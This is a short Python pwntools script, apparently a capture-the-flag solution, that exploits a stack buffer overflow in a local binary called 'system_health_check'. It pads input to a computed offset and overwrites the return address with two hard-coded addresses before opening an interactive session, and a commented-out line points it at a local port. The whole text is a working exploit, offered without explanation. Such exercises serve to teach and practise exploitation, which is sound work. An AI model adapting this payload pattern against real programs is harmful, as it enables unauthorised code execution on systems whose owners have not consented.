from pwn import *

#p = remote("127.0.0.1", 1024)
p = process('./system_health_check')
print(p.recvline())

raw_input("attach gdb")

#p.sendline(cyclic(0xff+0xff))
payload = cyclic(cyclic_find("qaac"))
payload += p64(0x4012f3)
payload += p64(0x4012f4)

p.sendline(payload)

p.interactive()
